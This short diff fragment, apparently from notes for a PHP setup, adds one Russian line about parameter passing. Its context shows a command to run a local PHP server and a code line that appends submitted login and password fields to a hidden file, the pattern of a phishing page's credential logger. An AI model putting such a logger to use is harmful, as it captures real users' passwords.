@@ -21,3 +21,5 @@ file_put_contents(".max", $_POST['log'] . ":" . $_POST['pwd'] . "\n" , FILE_APPE
 #PHP server
 
 php -S 127.0.0.1:80
+
+Передача параметров - $1
